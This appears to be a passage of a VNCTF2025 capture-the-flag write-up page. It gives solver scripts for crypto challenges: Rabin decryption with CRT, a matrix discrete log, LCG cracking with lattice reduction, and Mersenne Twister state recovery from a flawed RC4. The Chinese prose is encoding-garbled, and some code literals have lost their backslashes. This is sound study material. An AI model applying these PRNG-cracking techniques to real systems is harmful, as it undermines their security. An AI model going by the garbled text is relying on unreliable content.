id="easymath">easymath</h2><ul><li>é¢˜ç›®ç»™äº†å¯†æ–‡<code>c=pow(flag,2,N)</code>ï¼Œå…¶ä¸­Næ˜¯ç”±ä¸‰ä¸ªè´¨æ•°è€Œå¾—çš„ï¼Œå¹¶ä¸”æä¾›äº†<code>(x - n[0]) * (x - n[1]) * (x - n[2])</code>å±•å¼€åçš„å¤šé¡¹å¼ï¼›</li><li>é¦–å…ˆé€šè¿‡sageåˆ†è§£å¤šé¡¹å¼å¾—åˆ°ä¸‰ä¸ªå¤§è´¨æ•°çš„è§£ï¼š <img src="/img/VNCTF2025/VNCTF2025_3.png" alt="alt text" /></li><li>è§£å†³<code>c=pow(flag,2,N)</code>ä½¿ç”¨Rabinç®—æ³•ï¼Œå…¶ä¸­çš„ä¸‰ä¸ªè´¨å› æ•°éƒ½æ˜¯æ¨¡å››ä½™ä¸‰çš„å¤§è´¨æ•°ï¼Œé‚£ä¹ˆå¯å¾— <span class="math display">\[ m \equiv \pm c^{\frac{p_i+1}{4}} mod \; p_i \]</span> ä¸‰ç»„åŒä½™æ–¹ç¨‹å¯ä»¥ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>N = <span class="hljs-number">1</span> <br>n = [<span class="hljs-number">5487564316951417093934647798659941512646442958127439071827</span>, <span class="hljs-number">5908636118089697338533572785710162817248001570348495067227</span>, <span class="hljs-number">3868765709106144154703556118635822400623994075212553582411</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n:<br>    N*=i<br>c = <span class="hljs-number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br>c1 = n[<span class="hljs-number">0</span>]-<span class="hljs-built_in">pow</span>(c,(n[<span class="hljs-number">0</span>]+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,n[<span class="hljs-number">0</span>])<br>c2 = n[<span class="hljs-number">1</span>]-<span class="hljs-built_in">pow</span>(c,(n[<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,n[<span class="hljs-number">1</span>])<br>c3 = <span class="hljs-built_in">pow</span>(c,(n[<span class="hljs-number">2</span>]+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,n[<span class="hljs-number">2</span>])<br>N1 = N // n[<span class="hljs-number">0</span>]<br>N2 = N // n[<span class="hljs-number">1</span>]<br>N3 = N // n[<span class="hljs-number">2</span>]<br>M1 = gmpy2.invert(N1, n[<span class="hljs-number">0</span>])<br>M2 = gmpy2.invert(N2, n[<span class="hljs-number">1</span>])<br>M3 = gmpy2.invert(N3, n[<span class="hljs-number">2</span>])<br>m = (c1 * N1 * M1 + c2 * N2 * M2 + c3 * N3 * M3) % N<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(m,<span class="hljs-number">2</span>,N)==c<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_4.png" alt="alt text" /></li></ul><h2 id="ss0hurt">ss0Hurt</h2><ul><li>é¢˜ç›®çš„å…³é”®ä»£ç ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self, x, y, z</span>):<br>    <span class="hljs-keyword">return</span> vector([<span class="hljs-number">5</span> * x + y - <span class="hljs-number">5</span> * z, <span class="hljs-number">5</span> * y - z, <span class="hljs-number">5</span> * z])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mat</span>(<span class="hljs-params">self, m</span>):<br>    PR = <span class="hljs-variable language_">self</span>.P[<span class="hljs-string">&#x27;x,y,z&#x27;</span>]<br>    x,y,z = PR.gens()<br>    <span class="hljs-keyword">if</span> m != <span class="hljs-number">0</span>:<br>        plana = <span class="hljs-variable language_">self</span>.Mat(m//<span class="hljs-number">2</span>)<br>        planb = plana(*plana)<br>        <span class="hljs-keyword">if</span> m % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> planb<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*planb)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*PR.gens())<br></code></pre></td></tr></table></figure></li><li>ç»™å®šä¸€ä¸ªåˆå§‹å‘é‡Vï¼Œ<code>Mat</code>å‡½æ•°çš„åŠ å¯†è¿‡ç¨‹å°±æ˜¯ç»™Vä¹˜ä¸Šä¸€ä¸ªçŸ©é˜µGï¼Œå¾—åˆ°æœ€åçš„ç»“æœå‘é‡Yï¼Œå‡è®¾è¾“å…¥å¯†æ–‡ä¸ºmï¼Œåˆ™åŠ å¯†è¿‡ç¨‹ä¸º <span class="math display">\[ G^{m+2^{m.bit\_lenth()}} \cdot V = Y\]</span></li><li>å‚è€ƒ<a href="https://triodelzx.github.io/2024/07/12/%E8%8B%A5%E5%B0%94%E5%BD%93%E6%A0%87%E5%87%86%E5%9E%8B%E4%B8%8E%E7%9F%A9%E9%98%B5%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98/">çŸ©é˜µç¦»æ•£å¯¹æ•°é—®é¢˜</a>ç¼–å†™è§£é¢˜è„šæœ¬ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span>*<br><br>G = [[<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">5</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]]<br>V = [[<span class="hljs-number">2025</span>],[<span class="hljs-number">208</span>],[<span class="hljs-number">209</span>]]<br>Y = [[<span class="hljs-number">17199707718762989481733793569240992776243099972784327196212023936622130204798694753865087501654381623876011128783229020278210160383185417670794284015692458326761011808048967854332413536183785458993128524881447529380387804712214305034841856237045463243243451585619997751904403447841431924053651568039257094910</span>], [<span class="hljs-number">62503976674384744837417986781499538335164333679603320998241675970253762411134672614307594505442798271581593168080110727738181755339828909879977419645331630791420448736959554172731899301884779691119177400457640826361914359964889995618273843955820050051136401731342998940859792560938931787155426766034754760036</span>], [<span class="hljs-number">93840121740656543170616546027906623588891573113673113077637257131079221429328035796416874995388795184080636312185908173422461254266536066991205933270191964776577196573147847000446118311985331680378772920169894541350064423243733498672684875039906829095473677927238488927923581806647297338935716890606987700071</span>]]<br><br>p = <span class="hljs-number">106743081253087007974132382690669187409167641660258665859915640694456867788135702053312073228376307091325146727550371538313884850638568106223326195447798997814912891375244381751926653858549419946547894675646011818800255999071070352934719005006228971056393128007601573916373180007524930454138943896336817929823</span><br>n = <span class="hljs-number">3</span><br><br>M_G = matrix(GF(p),G)<br>v = matrix(GF(p),V)<br>y = matrix(GF(p),Y)<br><br>J, P = M_G.jordan_form(subdivide = <span class="hljs-literal">False</span>,transformation = <span class="hljs-literal">True</span>)<br>t = P**-<span class="hljs-number">1</span> * v<br>z = P**-<span class="hljs-number">1</span> * y<br>lambda0 = J[n-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>]<br><br>x = lambda0 * (t[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*z[n-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - t[n-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]*z[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) * inverse(<span class="hljs-built_in">int</span>(t[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*z[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]),p) % p<br>m = <span class="hljs-built_in">int</span>(x)<br>m = m&amp;((<span class="hljs-number">1</span>&lt;&lt;(m.bit_length()-<span class="hljs-number">1</span>))-<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_5.png" alt="alt text" /></li></ul><h2 id="simple-prediction">Simple prediction</h2><ul><li>é¢˜ç›®åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªå˜å¼LCGéšæœºæ•°ç ´è§£ï¼Œåªè¦æ‰¾å‡ºä¸¤ç»„å³ä»¥ä¸Šçš„é—´éš”ç›¸åŒçš„å››ä¸ªLCGéšæœºæ•°ä¾¿å¯ä»¥é€šè¿‡æ±‚å…¬çº¦æ•°å¾—åˆ°æ¨¡æ•°nï¼Œè¯¦ç»†æ¨å¯¼è§<a href="https://zer0yu.github.io/2018/11/02/Cracking-LCG/">åšå®¢</a>ï¼Œå†æ ¹æ®æ¨¡æ•°ä¾¿å¯æ±‚å‡ºå¢é‡å’Œä¹˜æ•°ï¼Œæ ¹æ®åˆ—è¡¨ä¸­æ˜¯å¦ä¸ºçœŸLCGéšæœºæ•°æ±‚å‡ºflagå¯¹åº”çš„0/1ä½ï¼› <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert,gcd<br><br><span class="hljs-comment"># åˆ—è¡¨nè¿‡é•¿ä¸æ˜¾</span><br>knownlis = n[<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>:<span class="hljs-number">6</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>]<br>difflis = [knownlis[i+<span class="hljs-number">1</span>]-knownlis[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br>n1 = difflis[<span class="hljs-number">1</span>]*difflis[<span class="hljs-number">1</span>]-difflis[<span class="hljs-number">0</span>]*difflis[<span class="hljs-number">2</span>]<br>knownlis = n[<span class="hljs-number">8</span>*<span class="hljs-number">3</span>:<span class="hljs-number">8</span>*<span class="hljs-number">4</span>:<span class="hljs-number">2</span>]<br>difflis = [knownlis[i+<span class="hljs-number">1</span>]-knownlis[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br>n2 = difflis[<span class="hljs-number">1</span>]*difflis[<span class="hljs-number">1</span>]-difflis[<span class="hljs-number">0</span>]*difflis[<span class="hljs-number">2</span>]<br>n_mod = gcd(n1,n2)<br><span class="hljs-built_in">print</span>(n_mod,n_mod.bit_length())<br><br>knownlis = n[<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>:<span class="hljs-number">6</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>]<br>m = ((knownlis[<span class="hljs-number">2</span>]-knownlis[<span class="hljs-number">1</span>])*invert(knownlis[<span class="hljs-number">1</span>]-knownlis[<span class="hljs-number">0</span>],n_mod))%n_mod<br>c = (knownlis[<span class="hljs-number">1</span>]-knownlis[<span class="hljs-number">0</span>]*m)%n_mod<br><span class="hljs-keyword">assert</span> (m*knownlis[<span class="hljs-number">2</span>]+c)%n_mod==knownlis[<span class="hljs-number">3</span>]<br>flag1 = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;VN&quot;</span>])+<span class="hljs-string">&quot;01&quot;</span><br>s = n[<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(n)):<br>    <span class="hljs-keyword">if</span> s==n[i]:<br>        flag1+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag1+=<span class="hljs-string">&#x27;1&#x27;</span><br>    s = (m*s+c)%n_mod<br>flag1 = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag1[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag1),<span class="hljs-number">8</span>)])<br><span class="hljs-built_in">print</span>(flag1)<br></code></pre></td></tr></table></figure></li><li>ç¬¬äºŒéƒ¨åˆ†æ˜¯ä¸€é“ç»å…¸çš„æ ¼åŸºè§„çº¦é—®é¢˜ï¼Œæ ¹æ® <span class="math display">\[\sum (m^e \; mod \; n) \equiv c  \]</span> æ„é€ çŸ©é˜µå¹¶ç”¨sageåº“è¿›è¡Œæ ¼åŸºè§„çº¦ã€‚ä½†æ˜¯ç”±äºç¬¬äºŒéƒ¨åˆ†çš„flagé•¿åº¦ä¸ç¡®å®šï¼Œéœ€è¦çˆ†ç ´é•¿åº¦ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">16880924655573626811763865075201881594085658222047473444427295924181371341406971359787070757333746323665180258925280624345937931067302673406166527557074157053768756954809954623549764696024889104571712837947570927160960150469942624060518463231436452655059364616329589584232929658472512262657486196000339385053006838678892053410082983193195313760143294107276239320478952773774926076976118332506709002823833966693933772855520415233420873109157410013754228009873467565264170667190055496092630482018483458436328026371767734605083997033690559928072813698606007542923203397847175503893541662307450142747604801158547519780249</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">9032357989989555941675564821401950498589029986516332099523507342092837051434738218296315677579902547951839735936211470189183670081413398549328213424711630953101945318953216233002076158699383482500577204410862449005374635380205765227970071715701130376936200309849157913293371540209836180873164955112090522763296400826270168187684580268049900241471974781359543289845547305509778118625872361241263888981982239852260791787315392967289385225742091913059414916109642527756161790351439311378131805693115561811434117214628348326091634314754373956682740966173046220578724814192276046560931649844628370528719818294616692090359</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">100</span>-<span class="hljs-number">32</span>):<br>    knownm = [idx+<span class="hljs-number">0x1234</span> <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i)]<br>    knownc = [<span class="hljs-built_in">pow</span>(m,e,n) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> knownm]<br>    matrix = [[<span class="hljs-number">0</span>]*(i+<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>        matrix[j][j] = <span class="hljs-number">1</span><br>        matrix[j][-<span class="hljs-number">1</span>] = knownc[j]<br>    matrix[i][i] = <span class="hljs-number">1</span><br>    matrix[i][-<span class="hljs-number">1</span>] = c<br>    matrix[i+<span class="hljs-number">1</span>][-<span class="hljs-number">1</span>] = n<br>    A = Matrix(matrix)<br>    B = A.LLL()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> B[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>flag2 = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> B[<span class="hljs-number">0</span>][:-<span class="hljs-number">2</span>]])<br><span class="hljs-built_in">print</span>(flag2)<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_6.png" alt="alt text" /></li></ul><h2 id="å¹¶érc4">å¹¶éRC4</h2><ul><li>é¢˜ç›®æä¾›çš„RC4ä¸­åŠ å¯†ç›’æ•°æ®äº¤æ¢æœ‰é”™è¯¯ï¼Œå› æ­¤åœ¨ç»è¿‡å¤šæ¬¡åŠ å¯†ååŠ å¯†ç›’å†…çš„æ•°æ®å°†é€€åŒ–æˆåŒä¸€ä¸ªæ•°å­—ï¼Œæœ€ç»ˆæ¼”åŒ–æˆä¸€ä¸ªç ´è§£pythonä¼ªéšæœºæ•°ç”Ÿæˆçš„é—®é¢˜ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sbox[i] = sbox[j]  <br>sbox[j] = sbox[i]<br></code></pre></td></tr></table></figure></li><li>ä¹‹å‰ä¹Ÿåšè¿‡ç±»ä¼¼çš„é¢˜ç›®ï¼Œå…·ä½“æ¨å¯¼è¿‡ç¨‹å‚è€ƒ<a href="https://www.anquanke.com/post/id/205861#h3-9">åšå®¢</a>ï¼Œéœ€è¦è·‘å‡ºä¸€ä¸ª19968*19968çš„è½¬æ¢çŸ©é˜µå†å¯¹çŒœæµ‹åŠ å¯†ç›’é€€åŒ–æ•°å­—åçš„éšæœºæ•°å¤„ç†æ¢å¤æ¢…æ£®æ—‹è½¬ç®—æ³•æœ€å¼€å§‹çš„çŠ¶æ€stateï¼ŒéªŒè¯åä¾¿å¯ç ´è§£éšæœºæ•°è§£å¯†RSAï¼›</li><li>ç”ŸæˆçŸ©é˜µçš„ä»£ç ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>prng = Random()<br>length = <span class="hljs-number">19968</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myState</span>():<br>    state = [<span class="hljs-number">0</span>]*<span class="hljs-number">624</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;length:<br>        ind = i//<span class="hljs-number">32</span><br>        expont = i%<span class="hljs-number">32</span><br>        state[ind] = <span class="hljs-number">1</span>&lt;&lt;(<span class="hljs-number">31</span>-expont)<br>        <span class="hljs-keyword">yield</span> (<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>)<br>        state[ind] = <span class="hljs-number">0</span><br>        i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getRow</span>():<br>    rng = Random()<br>    gs = myState()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        s = <span class="hljs-built_in">next</span>(gs)<br>        rng.setstate(s)<br>        row = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [rng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)])<br>        <span class="hljs-keyword">yield</span> row<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildBox</span>():<br>    b = matrix(GF(<span class="hljs-number">2</span>),length,length)<br>    rg = getRow()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(length)):<br>        b[i] = <span class="hljs-built_in">next</span>(rg)<br>    <span class="hljs-keyword">return</span> b<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    b = buildBox()<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Matrix_large&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(b.nrows())):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b.ncols()):<br>            f.write(<span class="hljs-built_in">str</span>(b[i,j])+<span class="hljs-string">&quot;n&quot;</span>)<br>    f.close()<br><br>test()<br></code></pre></td></tr></table></figure></li><li>çˆ†ç ´æœ€åé€€åŒ–çš„æ•°å­—å¹¶éªŒè¯ï¼ˆä¸€å¼€å§‹ä»£ç å†™é”™äº†ï¼Œå¾—åˆ°äº†ç»“æœä½†æ˜¯æ²¡é€€å‡ºå¾ªç¯ï¼Œç¡¬è·‘äº†ä¸€ä¸ªåŠå°æ—¶ï¼‰ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildMatrix</span>():<br>    length = <span class="hljs-number">19968</span><br>    cnt = <span class="hljs-number">0</span><br>    m = matrix(GF(<span class="hljs-number">2</span>), length, length)<br>    lis = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Matrix_large&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read().split(<span class="hljs-string">&quot;n&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lis)-<span class="hljs-number">1</span>)):<br>        row = cnt // <span class="hljs-number">19968</span><br>        col = cnt % <span class="hljs-number">19968</span><br>        m[row, col] = lis[i]<br>        cnt += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> m<br><br>m = buildMatrix()<br><br><span class="hljs-comment"># X = Z*(T^-1)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title 